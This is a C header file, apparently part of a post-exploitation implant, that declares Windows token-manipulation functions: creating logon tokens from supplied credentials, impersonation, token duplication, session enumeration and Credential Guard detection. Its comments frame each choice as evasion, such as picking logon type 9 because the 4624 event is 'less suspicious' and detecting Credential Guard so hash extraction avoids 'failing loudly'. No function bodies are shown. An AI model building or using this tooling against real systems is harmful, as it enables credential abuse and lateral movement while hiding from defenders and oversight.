/*
 * token_evasion.h — Token manipulation evasion techniques.
 *
 * Provides OPSEC-aware token operations:
 *   - Token filtering (strip dangerous privileges before use)
 *   - Logon type selection (LOGON32_LOGON_NEW_CREDENTIALS for network-only)
 *   - Credential Guard detection (avoid failing loudly)
 *   - LUID-aware token operations (target specific logon sessions)
 */
#ifndef TOKEN_EVASION_H
#define TOKEN_EVASION_H

#include <windows.h>

/* ─── Logon type for make_token / impersonation ─── */
typedef enum _SAFE_LOGON_TYPE {
    LOGON_TYPE_AUTO         = 0,  /* Auto-detect best type */
    LOGON_TYPE_INTERACTIVE  = 1,  /* Type 2: full token, triggers 4624 */
    LOGON_TYPE_NETWORK      = 2,  /* Type 3: network-only (no local access) */
    LOGON_TYPE_NEW_CREDS    = 3,  /* Type 9: keeps local token, uses creds for network */
    LOGON_TYPE_SERVICE      = 4,  /* Type 5: service logon */
} SAFE_LOGON_TYPE;

/* ─── Token info result ─── */
typedef struct _TOKEN_INFO {
    wchar_t  username[256];       /* DOMAIN\user */
    wchar_t  domain[128];
    DWORD    logonSessionId;      /* LUID low part */
    DWORD    integrityLevel;      /* 0=untrusted,1=low,2=med,3=high,4=system */
    BOOL     isElevated;
    BOOL     isImpersonating;
    DWORD    tokenType;           /* TokenPrimary(1) or TokenImpersonation(2) */
    DWORD    impersonationLevel;  /* SecurityAnonymous..SecurityDelegation */
} TOKEN_INFO;

/* ─── Privilege filter list ─── */
typedef struct _PRIV_FILTER {
    const wchar_t **keep;       /* NULL-terminated list of privileges to keep */
    BOOL            stripAll;   /* If TRUE, remove ALL privileges */
} PRIV_FILTER;

/*
 * Detect if Credential Guard (VBS/LSA protection) is active.
 * When CG is enabled, NTLM hash extraction and certain token
 * operations will fail. The agent should avoid these and warn.
 *
 * Detection: check for presence of LsaIso.exe (Credential Guard process)
 * and/or registry key HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags.
 *
 * Returns TRUE if Credential Guard is active.
 */
BOOL token_credential_guard_active(void);

/*
 * Create a logon token with the specified credentials and logon type.
 * Wraps LogonUserW with OPSEC-aware defaults.
 *
 * LOGON_TYPE_NEW_CREDENTIALS (type 9) is the safest for most post-ex:
 *   - Local access uses the current token (no behavioral change)
 *   - Only network access uses the new credentials
 *   - Doesn't require the password to be valid locally
 *   - Generates logon event 4624 type 9 (less suspicious than type 2)
 *
 * Returns a token handle on success, INVALID_HANDLE_VALUE on failure.
 */
HANDLE token_make_token(
    const wchar_t *domain,
    const wchar_t *username,
    const wchar_t *password,
    SAFE_LOGON_TYPE logonType
);

/*
 * Impersonate a token with optional privilege filtering.
 * If filter is non-NULL, specified privileges are removed from the
 * token before impersonation (reduces attack surface / detection).
 *
 * Returns TRUE on success.
 */
BOOL token_impersonate(HANDLE hToken, const PRIV_FILTER *filter);

/*
 * Revert to the original (self) token.
 * Wrapper around RevertToSelf() with error handling.
 */
BOOL token_revert(void);

/*
 * Get info about a token (username, integrity, type, etc.).
 */
BOOL token_get_info(HANDLE hToken, TOKEN_INFO *info);

/*
 * Get info about the current thread/process token.
 */
BOOL token_get_current_info(TOKEN_INFO *info);

/*
 * Enumerate logon sessions and their associated tokens.
 * For each session, calls the callback with session LUID and token info.
 * Requires SYSTEM privileges for cross-session access.
 *
 * Returns the number of sessions enumerated.
 */
typedef BOOL (*TOKEN_ENUM_CALLBACK)(LUID sessionId, TOKEN_INFO *info, void *ctx);
int token_enumerate_sessions(TOKEN_ENUM_CALLBACK callback, void *ctx);

/*
 * Duplicate a token with a specific impersonation level.
 * Useful for creating tokens suitable for specific operations.
 *
 * impLevel: SecurityAnonymous(0), SecurityIdentification(1),
 *           SecurityImpersonation(2), SecurityDelegation(3)
 */
HANDLE token_duplicate(HANDLE hToken, DWORD impLevel);

/*
 * Remove specific privileges from a token.
 * privNames: NULL-terminated array of privilege name strings.
 * Returns the number of privileges successfully removed.
 */
int token_strip_privileges(HANDLE hToken, const wchar_t **privNames);

/*
 * Common privilege lists for filtering */
extern const wchar_t *PRIVS_DANGEROUS[];   /* SeDebug, SeTcb, SeAssignPrimary, etc. */
extern const wchar_t *PRIVS_MINIMAL[];     /* Only SeChangeNotify, SeIncreaseWorkingSet */

#endif /* TOKEN_EVASION_H */
